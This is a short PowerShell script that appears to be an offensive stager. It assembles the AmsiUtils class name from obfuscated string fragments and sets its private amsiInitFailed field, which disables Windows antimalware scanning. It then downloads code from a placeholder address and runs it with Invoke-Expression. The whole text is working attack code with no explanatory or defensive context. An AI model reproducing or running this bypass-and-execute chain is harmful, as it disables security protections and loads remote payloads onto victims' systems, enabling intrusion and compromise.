Set-Variable -Name w -Value ('System.Management.Automation.A');
Set-Variable -Name c -Value ('si');Set-Variable -Name m -Value ('Utils');
Set-Variable -Name assembly -Value ([Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m)));
Set-Variable -Name field -Value ($assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static'));
$field.SetValue($null,$true);
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
IEX (New-Object Net.WebClient).DownloadString("GREEN")